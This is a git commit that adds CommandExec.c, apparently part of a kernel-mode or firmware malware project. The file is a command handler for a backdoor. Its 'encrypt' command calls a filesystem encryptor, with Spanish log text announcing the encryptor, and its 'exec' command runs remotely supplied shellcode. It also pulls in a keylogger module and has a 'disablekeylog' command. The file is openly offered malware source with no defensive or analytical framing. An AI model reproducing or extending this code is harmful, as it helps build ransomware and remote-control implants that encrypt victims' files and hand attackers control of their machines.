2195641f6ad2d0b7716cb4caf92b60ce8618d86c
itsrealaitorfirmware <aitorcitomasa10@gmail.com>
2025-07-18 12:51:02 +0200

    Create CommandExec.c

---
+++ src/KernelMode/CommandExec.c
@@ -0,0 +1,37 @@
+#include "CommandExec.h"
+#include "../Shared/Logger.h"
+#include "Keylogger.h"
+#include "Scheduler.h"
+#include "../Encryptor/EncryptFS.h"  // if you want to use it later
+
+STATIC BOOLEAN InterfaceReady = FALSE;
+
+BOOLEAN StartCommandInterface(void) {
+    InterfaceReady = TRUE;
+    LogInfo(L"Command interface ready\n");
+    return TRUE;
+}
+
+VOID ProcessCommand(CHAR16* Cmd) {
+    if (!InterfaceReady || Cmd == NULL) return;
+
+    if (StrCmp(Cmd, L"ping") == 0) {
+        LogInfo(L"Ping received\n");
+    }
+    else if (StrCmp(Cmd, L"disablekeylog") == 0) {
+        LogInfo(L"Keylogger disabled\n");
+
+    }
+    else if (StrCmp(Cmd, L"encrypt") == 0) {
+        LogInfo(L"[Cmd] Iniciando encriptador\n");
+        EncryptFilesystem();  
+    }
+    else if (StrnCmp(Cmd, L"exec ", 5) == 0) {
+        CHAR16* Payload = Cmd + 5;
+        LogInfo(L"[Cmd] Ejecutando payload remoto\n");
+        ExecuteShellcode(Payload);  
+    }
+    else {
+        LogWarning(L"Unknown command received\n");
+    }
+}
